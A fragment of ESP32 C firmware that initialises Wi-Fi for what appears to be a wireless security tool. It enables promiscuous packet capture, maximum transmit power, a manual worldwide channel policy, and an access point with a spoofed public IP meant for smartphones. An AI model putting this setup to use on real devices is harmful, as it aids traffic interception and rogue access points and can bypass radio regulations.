    ESP_ERROR_CHECK(err);

    ESP_ERROR_CHECK(esp_netif_init());

    esp_netif_t *ap_netif = esp_netif_create_default_wifi_ap();
    assert(ap_netif);

    esp_netif_ip_info_t ip_info;

    IP4_ADDR(&ip_info.ip, 124, 213, 16, 29); // for smartphones use public ip
    IP4_ADDR(&ip_info.gw, 124, 213, 16, 29);
    IP4_ADDR(&ip_info.netmask, 255, 0, 0, 0);
    esp_netif_dhcps_stop(ap_netif);
    esp_netif_set_ip_info(ap_netif, &ip_info);
    esp_netif_dhcps_start(ap_netif);
    esp_netif_set_hostname(ap_netif, CONFIG_LWIP_LOCAL_HOSTNAME);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    esp_wifi_set_mode(WIFI_MODE_STA);

    esp_wifi_set_channel(0, WIFI_SECOND_CHAN_NONE);

    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));

    esp_wifi_set_promiscuous(true);

    esp_wifi_set_max_tx_power(82);

   wifi_country_t ccconf = {
            .cc = "00", // worldwide setting
            .schan = 1,
            .nchan = 13,
            .policy = WIFI_COUNTRY_POLICY_MANUAL
    };

    if (esp_wifi_set_country(&ccconf) != ESP_OK) {
        ESP_LOGE(TAG, "Error during setup of wifi country code!");
    }

    ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &event_handler, NULL));

    return HTOOL_OK;
}